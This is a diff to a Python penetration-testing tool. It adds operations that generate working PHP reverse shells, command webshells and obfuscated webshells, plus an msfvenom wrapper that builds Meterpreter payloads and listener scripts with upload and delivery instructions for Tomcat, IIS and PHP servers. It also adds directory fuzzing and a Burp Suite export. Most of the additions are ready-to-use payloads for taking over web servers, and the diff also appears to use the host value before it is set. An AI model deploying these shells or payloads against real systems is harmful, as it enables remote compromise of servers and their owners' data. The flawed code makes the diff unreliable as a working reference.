@@ -21,11 +21,13 @@ import random
 import os
 import hashlib
 import base64
+import shutil
 import urllib.parse
 import urllib.request
 import urllib.error
 import ssl
 import http.client
+from pathlib import Path
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass, field, asdict
@@ -699,6 +701,9 @@ class WebSec:
         self.findings: List[Dict] = []
         self.info_findings: List[Dict] = []
         self.errors: List[str] = []
+
+        # Work directory for saving generated artifacts
+        self.work_dir = Path(self.output_dir) / re.sub(r'[^\w.-]', '_', self.host)
 
         # Parse target URL
         self.url, self.host, self.scheme, self.port = self._parse_target(target)
@@ -2273,6 +2278,825 @@ class WebSec:
         return results
 
     # =========================================================================
+    # OPERATION: PHP PAYLOAD GENERATOR
+    # =========================================================================
+
+    def op_php_payload(self) -> Dict:
+        """Generate PHP reverse shells and webshells."""
+        section("PHP PAYLOAD GENERATOR")
+
+        php_type = self.params.get("php_type", "reverse").lower()
+        lhost = self.params.get("lhost", "")
+        lport = str(self.params.get("lport", "4444"))
+        php_obfuscate = str(self.params.get("php_obfuscate", False)).lower() in ("true", "1", "yes")
+
+        out_dir = self.work_dir / "php_payloads"
+        out_dir.mkdir(parents=True, exist_ok=True)
+
+        payloads = {}
+
+        # ------------------------------------------------------------------
+        # REVERSE SHELL — Pentest Monkey style
+        # ------------------------------------------------------------------
+        if php_type in ("reverse", "all"):
+            if not lhost:
+                warn("php_payload reverse: lhost not set — payload will contain placeholder LHOST")
+            _lhost = lhost or "LHOST"
+            _lport = lport
+
+            reverse_php = f"""<?php
+// PHP Reverse Shell — Pentest Monkey style (public domain)
+// Usage: set up listener: nc -lvnp {_lport}
+// Then request this file from the target web server
+set_time_limit(0);
+$VERSION = "1.0";
+$ip   = '{_lhost}';
+$port = {_lport};
+$chunk_size    = 1400;
+$write_a       = null;
+$error_a       = null;
+$shell         = 'uname -a; w; id; sh -i';
+$daemon        = 0;
+$debug         = 0;
+
+if (function_exists('pcntl_fork')) {{
+    $pid = pcntl_fork();
+    if ($pid == -1) {{ die('could not fork'); }}
+    if ($pid) {{ exit(0); }}
+    if (posix_setsid() == -1) {{ die('Error: Cannot setsid()'); }}
+    $daemon = 1;
+}} else {{
+    print("WARNING: Failed to daemonize. This is quite common and not fatal.\\n");
+}}
+
+chdir("/");
+umask(0);
+
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {{ die("$errstr ($errno)\\n"); }}
+
+$descriptorspec = array(
+    0 => array("pipe", "r"),
+    1 => array("pipe", "w"),
+    2 => array("pipe", "w")
+);
+$process = proc_open($shell, $descriptorspec, $pipes);
+if (!is_resource($process)) {{ die("ERROR: Cannot spawn shell\\n"); }}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock,    0);
+
+while (1) {{
+    if (feof($sock))   {{ break; }}
+    if (feof($pipes[1])) {{ break; }}
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+    if (in_array($sock, $read_a)) {{
+        $input = fread($sock, $chunk_size);
+        fwrite($pipes[0], $input);
+    }}
+    if (in_array($pipes[1], $read_a)) {{
+        $input = fread($pipes[1], $chunk_size);
+        fwrite($sock, $input);
+    }}
+    if (in_array($pipes[2], $read_a)) {{
+        $input = fread($pipes[2], $chunk_size);
+        fwrite($sock, $input);
+    }}
+}}
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+?>
+"""
+            payloads["reverse"] = reverse_php
+            fname = out_dir / "reverse_shell.php"
+            fname.write_text(reverse_php)
+            ok(f"Reverse shell saved: {fname}")
+            info(f"  Listener: nc -lvnp {_lport}")
+            info(f"  Upload and request: curl http://TARGET/reverse_shell.php")
+
+        # ------------------------------------------------------------------
+        # WEBSHELL — authenticated POST-based
+        # ------------------------------------------------------------------
+        if php_type in ("webshell", "all"):
+            webshell_system = "<?php if(isset($_POST['c'])){system($_POST['c']);} ?>"
+            webshell_passthru = """<?php
+if(isset($_POST['c'])){
+    ob_start();
+    passthru($_POST['c']);
+    $out = ob_get_clean();
+    echo '<pre>' . htmlspecialchars($out) . '</pre>';
+}
+?>"""
+            payloads["webshell_system"] = webshell_system
+            payloads["webshell_passthru"] = webshell_passthru
+            (out_dir / "webshell_system.php").write_text(webshell_system)
+            (out_dir / "webshell_passthru.php").write_text(webshell_passthru)
+            ok(f"Webshells saved to: {out_dir}")
+            info("  Usage: curl -X POST http://TARGET/webshell_system.php -d 'c=id'")
+            info("  Usage: curl -X POST http://TARGET/webshell_passthru.php -d 'c=whoami'")
+
+        # ------------------------------------------------------------------
+        # CMD — GET parameter shell
+        # ------------------------------------------------------------------
+        if php_type in ("cmd", "all"):
+            cmd_shell = "<?php if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';} ?>"
+            payloads["cmd"] = cmd_shell
+            (out_dir / "cmd_shell.php").write_text(cmd_shell)
+            ok(f"CMD shell saved: {out_dir / 'cmd_shell.php'}")
+            info("  Usage: curl 'http://TARGET/cmd_shell.php?cmd=id'")
+
+        # ------------------------------------------------------------------
+        # OBFUSCATED — layered encoding tricks
+        # ------------------------------------------------------------------
+        if php_type in ("obfuscated", "all"):
+            # Layer 1: base64-encoded function name
+            sys_b64 = base64.b64encode(b"system").decode()
+            cmd_b64 = base64.b64encode(b"$_GET['c']").decode()
+            layer1 = f"<?php $f=base64_decode('{sys_b64}');$f($_GET['c']); ?>"
+
+            # Layer 2: chr() hex encoding of shell_exec
+            shell_exec_chars = ",".join(str(ord(c)) for c in "shell_exec")
+            layer2 = f"<?php $fn=implode('',array_map('chr',array({shell_exec_chars})));echo '<pre>'.$fn($_GET['c']).'</pre>'; ?>"
+
+            # Layer 3: variable variable trick
+            layer3 = """<?php
+${'_'.'GET'} = $_GET;
+$k = 'c';
+$cmd = $$k;
+$e = 'pas'.'sthru';
+$e($cmd);
+?>"""
+            payloads["obfuscated_l1"] = layer1
+            payloads["obfuscated_l2"] = layer2
+            payloads["obfuscated_l3"] = layer3
+            (out_dir / "obfuscated_layer1.php").write_text(layer1)
+            (out_dir / "obfuscated_layer2.php").write_text(layer2)
+            (out_dir / "obfuscated_layer3.php").write_text(layer3)
+            ok(f"Obfuscated shells saved to: {out_dir}")
+            info("  layer1: base64-encoded function name")
+            info("  layer2: chr() array encoding of function name")
+            info("  layer3: variable-variable trick with string concatenation")
+
+        # ------------------------------------------------------------------
+        # Optional: base64-encode the entire payload body
+        # ------------------------------------------------------------------
+        if php_obfuscate and payloads:
+            info("php_obfuscate=true: wrapping payloads in base64 eval encoder...")
+            obf_dir = out_dir / "base64_wrapped"
+            obf_dir.mkdir(exist_ok=True)
+            for name, body in payloads.items():
+                # Strip opening/closing tags for the body to wrap
+                inner = body.strip()
+                if inner.startswith("<?php"):
+                    inner = inner[5:]
+                if inner.endswith("?>"):
+                    inner = inner[:-2]
+                encoded = base64.b64encode(inner.strip().encode()).decode()
+                wrapped = f"<?php eval(base64_decode('{encoded}')); ?>"
+                (obf_dir / f"{name}_b64.php").write_text(wrapped)
+            ok(f"Base64-wrapped variants saved to: {obf_dir}")
+
+        # Add findings
+        self._add_finding(
+            "PHP Payload Generated",
+            detail=f"PHP {php_type} payload(s) generated and saved to {out_dir}",
+            evidence=f"Files: {', '.join(str(p.name) for p in out_dir.glob('*.php'))}",
+            severity_override="INFO",
+        )
+
+        # Print payload to terminal (syntax display)
+        section("Generated Payload Preview")
+        first_payload = next(iter(payloads.values()), "")
+        if first_payload:
+            print(f"{C}{'─'*60}{NC}", file=sys.stderr)
+            for line in first_payload.strip().split("\n")[:30]:
+                # Minimal keyword highlighting
+                line_out = line
+                for kw in ("<?php", "?>", "system", "shell_exec", "passthru", "base64_decode", "eval", "fsockopen", "proc_open"):
+                    line_out = line_out.replace(kw, f"{M}{kw}{NC}")
+                print(f"  {line_out}", file=sys.stderr)
+            if len(first_payload.strip().split("\n")) > 30:
+                print(f"  {DIM}... (truncated — see file){NC}", file=sys.stderr)
+            print(f"{C}{'─'*60}{NC}", file=sys.stderr)
+
+        info(f"All PHP payloads saved to: {out_dir}")
+        return {"output_dir": str(out_dir), "payloads": list(payloads.keys()), "php_type": php_type}
+
+    # =========================================================================
+    # OPERATION: MSFVENOM PAYLOAD WRAPPER
+    # =========================================================================
+
+    def op_msf_payload(self) -> Dict:
+        """Wrap msfvenom for web-delivery payloads."""
+        section("MSFVENOM PAYLOAD GENERATOR")
+
+        msf_type   = self.params.get("msf_type", "php").lower()
+        lhost      = self.params.get("lhost", "")
+        lport      = str(self.params.get("lport", "4444"))
+        msf_format = self.params.get("msf_format", "raw")
+
+        out_dir = self.work_dir / "msf_payloads"
+        out_dir.mkdir(parents=True, exist_ok=True)
+
+        if not lhost:
+            warn("lhost not set — msfvenom command will contain placeholder LHOST")
+        _lhost = lhost or "LHOST"
+
+        # Build msfvenom spec per type
+        specs = {
+            "php":  {
+                "payload":  "php/meterpreter/reverse_tcp",
+                "format":   "raw",
+                "outfile":  "payload.php",
+                "handler_payload": "php/meterpreter/reverse_tcp",
+            },
+            "war":  {
+                "payload":  "java/meterpreter/reverse_tcp",
+                "format":   "war",
+                "outfile":  "payload.war",
+                "handler_payload": "java/meterpreter/reverse_tcp",
+            },
+            "jsp":  {
+                "payload":  "java/jsp_shell_reverse_tcp",
+                "format":   "raw",
+                "outfile":  "payload.jsp",
+                "handler_payload": "java/jsp_shell_reverse_tcp",
+            },
+            "aspx": {
+                "payload":  "windows/meterpreter/reverse_tcp",
+                "format":   "aspx",
+                "outfile":  "payload.aspx",
+                "handler_payload": "windows/meterpreter/reverse_tcp",
+            },
+        }
+
+        if msf_type not in specs:
+            bad(f"Unknown msf_type '{msf_type}'. Choose from: {', '.join(specs)}")
+            return {"error": f"Unknown msf_type: {msf_type}"}
+
+        spec       = specs[msf_type]
+        payload_p  = spec["payload"]
+        fmt        = msf_format if msf_format != "raw" else spec["format"]
+        outfile    = out_dir / spec["outfile"]
+        handler_rc = out_dir / "handler.rc"
+
+        # msfvenom command
+        msf_cmd = [
+            "msfvenom",
+            "-p", payload_p,
+            f"LHOST={_lhost}",
+            f"LPORT={lport}",
+            "-f", fmt,
+            "-o", str(outfile),
+        ]
+        msf_cmd_str = " ".join(msf_cmd)
+
+        # handler.rc
+        handler_content = f"""use exploit/multi/handler
+set PAYLOAD {spec['handler_payload']}
+set LHOST {_lhost}
+set LPORT {lport}
+set ExitOnSession false
+exploit -j
+"""
+        handler_rc.write_text(handler_content)
+        ok(f"Handler RC written: {handler_rc}")
+        info(f"  Launch listener: msfconsole -q -r {handler_rc}")
+
+        # Run msfvenom if available
+        msfvenom_path = shutil.which("msfvenom")
+        run_result = {}
+        if msfvenom_path:
+            info(f"msfvenom found at {msfvenom_path} — generating payload...")
+            try:
+                proc = subprocess.run(
+                    msf_cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=120,
+                )
+                if proc.returncode == 0:
+                    ok(f"Payload generated: {outfile}")
+                    run_result = {"generated": True, "path": str(outfile)}
+                else:
+                    bad(f"msfvenom failed: {proc.stderr.strip()[:200]}")
+                    run_result = {"generated": False, "stderr": proc.stderr.strip()[:200]}
+            except Exception as e:
+                bad(f"msfvenom error: {e}")
+                run_result = {"generated": False, "error": str(e)}
+        else:
+            warn("msfvenom not found — printing manual command:")
+            print(f"\n  {Y}{msf_cmd_str}{NC}\n", file=sys.stderr)
+            run_result = {"generated": False, "manual_cmd": msf_cmd_str}
+
+        # Delivery instructions
+        section("Delivery Instructions")
+        if msf_type == "php":
+            info("Upload payload.php to target via file upload or webshell")
+            info("Navigate to it in browser or: curl http://TARGET/payload.php")
+        elif msf_type == "war":
+            info("Deploy payload.war to Tomcat manager: /manager/html -> Deploy WAR")
+            info("Access: http://TARGET:8080/payload/")
+        elif msf_type == "jsp":
+            info("Upload payload.jsp to a Tomcat webapps directory")
+            info("Access: http://TARGET:8080/payload.jsp")
+        elif msf_type == "aspx":
+            info("Upload payload.aspx to an IIS/ASP.NET web directory")
+            info("Access: http://TARGET/payload.aspx")
+
+        print(f"\n  {G}Start handler:{NC} msfconsole -q -r {handler_rc}", file=sys.stderr)
+
+        self._add_finding(
+            "MSF Payload Generated",
+            detail=f"msfvenom {msf_type} payload prepared. Payload: {outfile} | Handler: {handler_rc}",
+            evidence=f"Command: {msf_cmd_str}",
+            severity_override="INFO",
+        )
+
+        return {
+            "msf_type": msf_type,
+            "payload": payload_p,
+            "lhost": _lhost,
+            "lport": lport,
+            "format": fmt,
+            "outfile": str(outfile),
+            "handler_rc": str(handler_rc),
+            "handler_launch": f"msfconsole -q -r {handler_rc}",
+            "run_result": run_result,
+        }
+
+    # =========================================================================
+    # OPERATION: DIRECTORY/FILE FUZZING WRAPPER
+    # =========================================================================
+
+    # Built-in 200-path fallback wordlist
+    _FUZZ_BUILTIN_PATHS = [
+        "admin", "administrator", "login", "wp-admin", "phpmyadmin", "cpanel",
+        "webmail", "dashboard", "manage", "manager", "backend", "control",
+        "robots.txt", "sitemap.xml", ".htaccess", "crossdomain.xml",
+        ".env", ".env.local", ".env.backup", ".git/HEAD", ".git/config",
+        "config.php", "config.js", "config.yml", "wp-config.php", "web.config",
+        "backup.sql", "backup.zip", "backup.tar.gz", "db.sql", "dump.sql",
+        "api", "api/v1", "api/v2", "api/health", "api/status", "swagger",
+        "swagger.json", "openapi.json", "graphql", "graphiql",
+        "debug", "test", "phpinfo.php", "info.php", "server-status",
+        "server-info", "status", "health", "ping", "metrics",
+        "uploads", "images", "files", "static", "assets", "media",
+        "include", "includes", "src", "lib", "vendor",
+        ".svn", ".svn/entries", ".DS_Store", "package.json", "composer.json",
+        "requirements.txt", "Gemfile", "yarn.lock", "package-lock.json",
+        "cgi-bin", "cgi-bin/test.cgi", "old", "bak", "backup",
+        "tmp", "temp", "cache", "log", "logs", "error.log", "access.log",
+        "wp-login.php", "wp-cron.php", "xmlrpc.php",
+        "install.php", "setup.php", "install", "setup",
+        "user", "users", "account", "register", "signup", "signin",
+        "checkout", "cart", "shop", "store", "payment",
+        "search", "query", "find", "ajax",
+        "readme.txt", "README.md", "CHANGELOG.md", "LICENSE",
+        "server.js", "app.js", "index.php", "default.php",
+        "edit", "delete", "update", "create", "new", "add",
+        "upload", "download", "export", "import",
+        "wp-content/uploads", "wp-content/plugins", "wp-content/themes",
+        "sites/default/files", "modules", "themes",
+        "console", "shell", "cmd", "exec",
+        "v1", "v2", "v3", "rest", "rpc", "soap",
+        ".well-known/security.txt", "security.txt",
+        "crossdomain.xml", "clientaccesspolicy.xml",
+        "trace.axd", "elmah.axd", "webresource.axd",
+        "actuator", "actuator/env", "actuator/health", "actuator/mappings",
+        "jolokia", "jolokia/list", "h2-console",
+    ]
+
+    def op_fuzz(self) -> Dict:
+        """Directory/file fuzzing wrapper — auto-selects ffuf/gobuster/dirbuster."""
+        section("DIRECTORY / FILE FUZZER")
+
+        fuzz_tool  = self.params.get("fuzz_tool", "auto").lower()
+        wordlist   = self.params.get("wordlist", "")
+        extensions = self.params.get("extensions", "php,html,txt,js,bak")
+        threads    = int(self.params.get("threads", 40))
+        fuzz_mode  = self.params.get("fuzz_mode", "dir").lower()
+
+        out_dir = self.work_dir / "fuzz"
+        out_dir.mkdir(parents=True, exist_ok=True)
+
+        # -- Tool resolution --------------------------------------------------
+        if fuzz_tool == "auto":
+            for candidate in ("ffuf", "gobuster", "dirbuster"):
+                if shutil.which(candidate):
+                    fuzz_tool = candidate
+                    break
+            else:
+                fuzz_tool = "builtin"
+        elif fuzz_tool != "builtin" and not shutil.which(fuzz_tool):
+            warn(f"{fuzz_tool} not found — falling back to built-in discovery")
+            fuzz_tool = "builtin"
+
+        ok(f"Fuzzing tool: {fuzz_tool}")
+
+        # -- Wordlist resolution -----------------------------------------------
+        wl_candidates = [
+            wordlist,
+            "/usr/share/seclists/Discovery/Web-Content/common.txt",
+            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+            "/usr/share/dirb/wordlists/common.txt",
+        ]
+        resolved_wl = ""
+        for wl in wl_candidates:
+            if wl and os.path.isfile(wl):
+                resolved_wl = wl
+                break
+
+        if not resolved_wl and fuzz_tool != "builtin":
+            warn("No wordlist found — falling back to built-in path list")
+            fuzz_tool = "builtin"
+
+        if resolved_wl:
+            info(f"Wordlist: {resolved_wl}")
+
+        # -- Build and run command --------------------------------------------
+        found_paths = []
+        ext_str = "." + (",." .join(extensions.split(","))) if extensions else ""
+
+        if fuzz_tool == "ffuf":
+            results_json = str(out_dir / "ffuf_results.json")
+            if fuzz_mode == "vhost":
+                cmd = [
+                    "ffuf", "-w", resolved_wl,
+                    "-u", self.url,
+                    "-H", f"Host: FUZZ.{self.host}",
+                    "-t", str(threads),
+                    "-o", results_json, "-of", "json",
+                ]
+            elif fuzz_mode == "dns":
+                cmd = [
+                    "ffuf", "-w", resolved_wl,
+                    "-u", f"https://FUZZ.{self.host}/",
+                    "-t", str(threads),
+                    "-o", results_json, "-of", "json",
+                ]
+            else:  # dir
+                cmd = [
+                    "ffuf", "-u", f"{self.url}/FUZZ",
+                    "-w", resolved_wl,
+                    "-e", "." + extensions.replace(",", ",."),
+                    "-t", str(threads),
+                    "-o", results_json, "-of", "json",
+                    "-mc", "200,201,204,301,302,307,401,403,405",
+                ]
+            info(f"Running: {' '.join(cmd)}")
+            try:
+                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                        stderr=subprocess.STDOUT, text=True)
+                for line in proc.stdout:
+                    line = line.rstrip()
+                    if line:
+                        print(f"  {DIM}{line}{NC}", file=sys.stderr)
+                        # Parse ffuf live output lines: STATUS CODE, SIZE etc.
+                        m = re.search(r'\[Status: (\d+).*?\] \* FUZZ: (.+)', line)
+                        if m:
+                            found_paths.append({"path": m.group(2).strip(), "status": int(m.group(1))})
+                proc.wait()
+                # Parse JSON results if available
+                if os.path.isfile(results_json):
+                    try:
+                        with open(results_json) as f:
+                            jr = json.load(f)
+                        for r in jr.get("results", []):
+                            p = r.get("input", {}).get("FUZZ", "") or r.get("url", "")
+                            s = r.get("status", 0)
+                            sz = r.get("length", 0)
+                            if p and {"path": p, "status": s} not in found_paths:
+                                found_paths.append({"path": p, "status": s, "size": sz})
+                    except Exception:
+                        pass
+            except Exception as e:
+                bad(f"ffuf error: {e}")
+
+        elif fuzz_tool == "gobuster":
+            results_txt = str(out_dir / "gobuster_results.txt")
+            if fuzz_mode == "vhost":
+                cmd = [
+                    "gobuster", "vhost",
+                    "-u", self.url,
+                    "-w", resolved_wl,
+                    "-t", str(threads),
+                    "-o", results_txt,
+                ]
+            elif fuzz_mode == "dns":
+                cmd = [
+                    "gobuster", "dns",
+                    "-d", self.host,
+                    "-w", resolved_wl,
+                    "-t", str(threads),
+                    "-o", results_txt,
+                ]
+            else:  # dir
+                cmd = [
+                    "gobuster", "dir",
+                    "-u", self.url,
+                    "-w", resolved_wl,
+                    "-x", extensions,
+                    "-t", str(threads),
+                    "-o", results_txt,
+                ]
+            info(f"Running: {' '.join(cmd)}")
+            try:
+                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                        stderr=subprocess.STDOUT, text=True)
+                for line in proc.stdout:
+                    line = line.rstrip()
+                    if line:
+                        print(f"  {DIM}{line}{NC}", file=sys.stderr)
+                        # gobuster format: /path (Status: 200) [Size: 1234]
+                        m = re.match(r'(/.+?)\s+\(Status:\s*(\d+)\)(?:\s+\[Size:\s*(\d+)\])?', line)
+                        if m:
+                            found_paths.append({
+                                "path": m.group(1),
+                                "status": int(m.group(2)),
+                                "size": int(m.group(3) or 0),
+                            })
+                proc.wait()
+            except Exception as e:
+                bad(f"gobuster error: {e}")
+
+        elif fuzz_tool == "dirbuster":
+            jar = "/usr/share/dirbuster/dirbuster.jar"
+            if not os.path.isfile(jar):
+                warn("dirbuster.jar not found at /usr/share/dirbuster/dirbuster.jar")
+                info("Install: sudo apt-get install dirbuster")
+                fuzz_tool = "builtin"
+            else:
+                cmd = [
+                    "java", "-jar", jar,
+                    "-u", self.url,
+                    "-l", resolved_wl,
+                    "-t", str(threads),
+                    "-e", extensions,
+                ]
+                info(f"Running: {' '.join(cmd)}")
+                try:
+                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                            stderr=subprocess.STDOUT, text=True)
+                    for line in proc.stdout:
+                        line = line.rstrip()
+                        if line:
+                            print(f"  {DIM}{line}{NC}", file=sys.stderr)
+                    proc.wait()
+                except Exception as e:
+                    bad(f"dirbuster error: {e}")
+
+        # Built-in fallback
+        if fuzz_tool == "builtin":
+            warn("Using built-in path list (limited). Install ffuf or gobuster for full fuzzing.")
+            info("Install ffuf:     go install github.com/ffuf/ffuf/v2@latest")
+            info("Install gobuster: sudo apt-get install gobuster")
+            paths_to_check = list(self._FUZZ_BUILTIN_PATHS)
+            # Expand with extensions
+            ext_list = [e.strip() for e in extensions.split(",") if e.strip()]
+            expanded = []
+            for p in paths_to_check[:80]:
+                expanded.append(p)
+                if "." not in p:
+                    for ext in ext_list:
+                        expanded.append(f"{p}.{ext}")
+            info(f"Checking {len(expanded)} paths with {self.threads} threads...")
+
+            def _check(path):
+                if not path.startswith("/"):
+                    path = "/" + path
+                url = f"{self.url}{path}"
+                r = self._request(url, allow_redirects=False, timeout=5.0)
+                if r and r["status"] not in (404, 400, 410):
+                    return {"path": path, "status": r["status"], "size": len(r["body"])}
+                return None
+
+            with ThreadPoolExecutor(max_workers=min(self.threads, 20)) as ex:
+                futs = {ex.submit(_check, p): p for p in expanded}
+                for fut in as_completed(futs):
+                    res = fut.result()
+                    if res:
+                        found_paths.append(res)
+
+        # -- Report findings --------------------------------------------------
+        ok(f"Fuzzing complete: {len(found_paths)} path(s) found")
+        interesting_kw = {".env", ".git", "config", "backup", "admin", "phpinfo",
+                          "debug", ".sql", "swagger", "graphql", "console", "shell",
+                          "actuator", "token", "secret", "pass", "password"}
+        for entry in found_paths:
+            path  = entry.get("path", "")
+            status = entry.get("status", 0)
+            size  = entry.get("size", "?")
+            is_int = any(kw in path.lower() for kw in interesting_kw)
+            if is_int:
+                bad(f"[{status}] {path} (size:{size}) <- INTERESTING")
+                self._add_finding(
+                    "sensitive_files_exposed",
+                    detail=f"Interesting path found: {path} [{status}]",
+                    evidence=f"HTTP {status} at {self.url}{path}",
+                    url=f"{self.url}{path}",
+                )
+            else:
+                info(f"[{status}] {path} (size:{size})")
+            # Always add an INFO finding
+            self._add_finding(
+                f"[{status}] {path}",
+                detail=f"Discovered path: {path} (size: {size})",
+                evidence=f"HTTP {status}",
+                url=f"{self.url}{path}",
+                severity_override="INFO",
+            )
+
+        # Save results
+        results_out = out_dir / "fuzz_results.json"
+        results_out.write_text(json.dumps(found_paths, indent=2))
+        info(f"Results saved: {results_out}")
+
+        return {
+            "tool": fuzz_tool,
+            "wordlist": resolved_wl or "builtin",
+            "extensions": extensions,
+            "fuzz_mode": fuzz_mode,
+            "threads": threads,
+            "found": found_paths,
+            "found_count": len(found_paths),
+            "results_file": str(results_out),
+        }
+
+    # =========================================================================
+    # OPERATION: BURP SUITE EXPORT
+    # =========================================================================
+
+    def op_burp_export(self) -> Dict:
+        """Generate Burp Suite-compatible artifacts."""
+        section("BURP SUITE EXPORT")
+
+        out_dir = self.work_dir / "burp_export"
+        out_dir.mkdir(parents=True, exist_ok=True)
+
+        # -- Raw HTTP request capture -----------------------------------------
+        info(f"Fetching homepage to capture raw request/response: {self.url}")
+        resp = self._request(self.url)
+
+        raw_request_path = out_dir / "raw_request.txt"
+        if resp:
+            # Build raw HTTP request in Burp Repeater format
+            parsed = urllib.parse.urlparse(self.url)
+            path_qs = parsed.path or "/"
+            host_header = parsed.hostname
+            if parsed.port and parsed.port not in (80, 443):
+                host_header = f"{parsed.hostname}:{parsed.port}"
+
+            raw_req_lines = [
+                f"GET {path_qs} HTTP/1.1",
+                f"Host: {host_header}",
+                f"User-Agent: {self.user_agent}",
+                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language: en-US,en;q=0.9",
+                "Accept-Encoding: gzip, deflate",
+                "Connection: close",
+                "",
+                "",
+            ]
+            raw_request_txt = "\n".join(raw_req_lines)
+            raw_request_path.write_text(raw_request_txt)
+            ok(f"Raw request saved: {raw_request_path}")
+
+            # Response preview
+            resp_preview = out_dir / "response_preview.txt"
+            resp_lines = [f"HTTP/1.1 {resp['status']} OK"]
+            for k, v in resp["headers"].items():
+                resp_lines.append(f"{k}: {v}")
+            resp_lines.append("")
+            resp_lines.append(resp["body"][:4000])
+            resp_preview.write_text("\n".join(resp_lines))
+            ok(f"Response preview saved: {resp_preview}")
+        else:
+            warn("Could not fetch homepage — creating template raw_request.txt")
+            parsed = urllib.parse.urlparse(self.url)
+            path_qs = parsed.path or "/"
+            raw_request_txt = (
+                f"GET {path_qs} HTTP/1.1\n"
+                f"Host: {self.host}\n"
+                f"User-Agent: Mozilla/5.0\n"
+                "Accept: */*\n"
+                "Connection: close\n\n"
+            )
+            raw_request_path.write_text(raw_request_txt)
+
+        # -- Burp target scope JSON -------------------------------------------
+        scope_json = {
+            "target": {
+                "scope": {
+                    "advanced_mode": True,
+                    "exclude": [],
+                    "include": [
+                        {
+                            "enabled": True,
+                            "host": self.host,
+                            "protocol": self.scheme.upper(),
+                            "port": {
+                                "enabled": True,
+                                "matchtype": "litEquals",
+                                "value": str(self.port),
+                            },
+                            "file": {
+                                "enabled": False,
+                                "matchtype": "regex",
+                                "value": ".*",
+                            },
+                        }
+                    ],
+                }
+            }
+        }
+        scope_path = out_dir / "scope.json"
+        scope_path.write_text(json.dumps(scope_json, indent=2))
+        ok(f"Burp scope config saved: {scope_path}")
+
+        # -- Intruder payload list from common params -------------------------
+        common_params = [
+            "id", "user", "username", "password", "pass", "email", "name",
+            "q", "query", "search", "s", "term", "keyword", "keywords",
+            "url", "redirect", "next", "return", "returnUrl", "redir",
+            "file", "path", "dir", "folder", "page", "view", "template",
+            "action", "cmd", "command", "exec", "run", "system",
+            "token", "csrf", "key", "api_key", "apikey", "secret",
+            "callback", "format", "output", "type", "lang", "language",
+            "cat", "category", "tag", "order", "sort", "filter",
+            "limit", "offset", "start", "end", "count", "max",
+            "debug", "test", "admin", "mode", "op", "operation",
+            "data", "input", "value", "param", "args",
+        ]
+        # Try to enrich from page source
+        if resp and resp.get("body"):
+            body = resp["body"]
+            form_params = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', body, re.IGNORECASE)
+            for p in form_params:
+                if p not in common_params:
+                    common_params.append(p)
+            # Also grab URL query params from href/src attributes
+            url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', body)
+            for p in url_params:
+                if p not in common_params:
+                    common_params.append(p)
+
+        intruder_path = out_dir / "intruder_payloads.txt"
+        intruder_path.write_text("\n".join(common_params))
+        ok(f"Intruder payload list saved: {intruder_path} ({len(common_params)} params)")
+
+        # -- Usage instructions -----------------------------------------------
+        section("How to Use These Files in Burp Suite")
+        print(f"""
+  {W}1. raw_request.txt — Burp Repeater:{NC}
+     • Open Burp Suite → Repeater tab
+     • Click the "pencil" icon to edit the request manually, OR
+     • Go to Repeater → right-click → "Paste from clipboard" after copying the file
+     • Set the target host to: {self.host}:{self.port}  (HTTPS: {self.scheme == 'https'})
+
+  {W}2. scope.json — Target Scope:{NC}
+     • Burp → Target → Scope → gear icon → "Load from JSON"
+     • Select: {scope_path}
+     • This restricts Burp's crawler and scanner to {self.host} only
+
+  {W}3. intruder_payloads.txt — Intruder Payload List:{NC}
+     • Burp → Intruder → Payloads → Payload type: Simple list
+     • Click "Load..." → select: {intruder_path}
+     • Use for parameter fuzzing in §injection points§
+
+  {W}Recommended Burp workflow:{NC}
+     1. Load scope.json to set target scope
+     2. Browse site via Burp proxy to populate sitemap
+     3. Right-click target in sitemap → "Scan" (Burp Pro) or use Active Scan
+     4. Use raw_request.txt in Repeater for manual testing
+     5. Use intruder_payloads.txt for parameter discovery in Intruder
+""", file=sys.stderr)
+
+        self._add_finding(
+            "Burp Export Ready",
+            detail=f"Burp Suite artifacts generated in {out_dir}",
+            evidence=f"Files: raw_request.txt, scope.json, intruder_payloads.txt",
+            severity_override="INFO",
+        )
+
+        return {
+            "output_dir": str(out_dir),
+            "raw_request": str(raw_request_path),
+            "scope_json": str(scope_path),
+            "intruder_payloads": str(intruder_path),
+            "param_count": len(common_params),
+            "target_host": self.host,
+            "target_port": self.port,
+            "target_scheme": self.scheme,
+        }
+
+    # =========================================================================
     # OPERATION: FULL SCAN
     # =========================================================================
 
@@ -2294,6 +3118,8 @@ class WebSec:
         results["file_upload"] = self.op_file_upload()
         results["rate_limit"] = self.op_rate_limit()
         results["wordpress"] = self.op_wordpress()
+        results["fuzz"] = self.op_fuzz()
+        results["burp_export"] = self.op_burp_export()
 
         return results
 
@@ -2331,6 +3157,10 @@ class WebSec:
             "rate_limit": self.op_rate_limit,
             "wordpress": self.op_wordpress,
             "stealth": self.op_stealth,
+            "php_payload": self.op_php_payload,
+            "msf_payload": self.op_msf_payload,
+            "fuzz": self.op_fuzz,
+            "burp_export": self.op_burp_export,
         }
 
         func = operations.get(self.operation, self.op_recon)
